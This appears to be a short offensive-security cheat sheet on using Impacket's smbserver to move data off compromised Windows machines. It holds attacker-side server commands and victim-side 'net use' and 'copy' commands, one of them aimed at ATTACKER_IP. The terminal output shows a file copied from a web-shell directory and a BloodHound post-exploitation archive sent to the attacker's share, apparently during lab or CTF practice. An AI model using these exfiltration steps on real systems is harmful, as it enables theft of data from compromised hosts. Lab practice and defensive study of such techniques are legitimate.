https://vk9-sec.com/smb-server-with-impaket-smbserver/

https://notes.offsec-journey.com/active-directory/windows-priv-esc/file-transfer

### [Simple but obsolete SMB1 protocol and unsafe](#simple-but-obsolete-smb1-protocol-and-unsafe-1)

### [smb2support](#smb2support-1)

### [With Username & Password](#with-username--password-1)


### Simple but obsolete SMB1 protocol and unsafe
```
$ impacket-smbserver sharethis .
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed

... waiting for incoming ...
```

### With Username & Password
```
$ impacket-smbserver sharethis . -username listening -password connections

net use \\ATTACKER_IP\share /USER:user s3cureP@ssword 

c:\inetpub\wwwroot\z>net use \\10.10.16.52\sharethis /user:listening connections                                                     
net use \\10.10.16.52\sharethis /user:listening connections                                                                          
The command completed successfully.

c:\inetpub\wwwroot\z>net view \\10.10.16.52                                                                                          
net view \\10.10.16.52                                                                                                               
Shared resources at \\10.10.16.52                                                                                                    
                                                                                                                                     
(null)                                                                                                                               
                                                                                                                                     
Share name  Type  Used as  Comment                                                                                                   
                                                                                                                                     
-------------------------------------------------------------------------------                                                      
SHARETHIS   Disk  (UNC)                                                                                                              
The command completed successfully.



c:\inetpub\wwwroot\z>copy out.txt \\10.10.16.52\sharethis                                                                            
copy out.txt \\10.10.16.52\sharethis                                                                                                 
        1 file(s) copied.                                                                                                            
                                                                                                                                     
c:\inetpub\wwwroot\z> 
```

### smb2support
$ $ smbserver a . -smb2support -username abc -password 123
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
...

PS C:\Users\Administrator> net use \\10.1.1.1\a
Enter the user name for '10.1.1.1': abc
Enter the password for 10.1.1.1: 123
The command completed successfully.

PS C:\Users\Administrator>
PS C:\Users\Administrator> copy .\THM-PostExploit_20230909004059_BloodHound.zip \\10.1.1.1\a
PS C:\Users\Administrator> 